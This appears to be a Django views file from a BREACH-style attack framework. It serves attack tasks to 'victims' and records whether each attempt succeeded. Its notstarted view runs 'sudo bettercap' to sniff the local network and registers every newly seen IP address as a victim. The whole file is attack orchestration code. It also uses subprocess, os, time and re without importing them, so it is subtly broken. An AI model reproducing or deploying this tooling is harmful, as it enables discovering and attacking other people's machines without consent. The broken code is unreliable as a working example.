from django.http import Http404, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from breach.strategy import Strategy
from breach.models import Victim

import json


def get_work(request, victim_id=0):
    assert(victim_id)

    try:
        victim = Victim.objects.get(pk=victim_id)
    except:
        raise Http404('Victim not found')

    strategy = Strategy(victim)
    new_work = strategy.get_work()

    return JsonResponse(new_work)


@csrf_exempt
def work_completed(request, victim_id=0):
    assert(victim_id)

    realtime_parameters = json.loads(request.body.decode('utf-8'))
    assert('success' in realtime_parameters)

    success = realtime_parameters['success']

    try:
        victim = Victim.objects.get(pk=victim_id)
    except:
        raise Http404('Victim not found')

    strategy = Strategy(victim)
    victory = strategy.work_completed(success)

    return JsonResponse({
        'victory': victory
    })


def notstarted(request):
    if request.method == 'GET':
        proc = subprocess.Popen(['sudo', 'bettercap'], stdout=subprocess.PIPE, preexec_fn=os.setpgrp)
        time.sleep(10)
        proc.terminate()
        output = proc.communicate()[0]
        regex = r'\[\bNEW\b\]\s[0-9]+(?:\.[0-9]+){3}'
        new_ips = re.findall(regex, output)

        create_victims = [Victim.create_victim({'sourceip': ip[6:], 'state': 'discovered'})for ip in new_ips]
        new_victims = [victim.sourceip for victim in create_victims]
        return JsonResponse({
            'new_victims': new_victims
        })
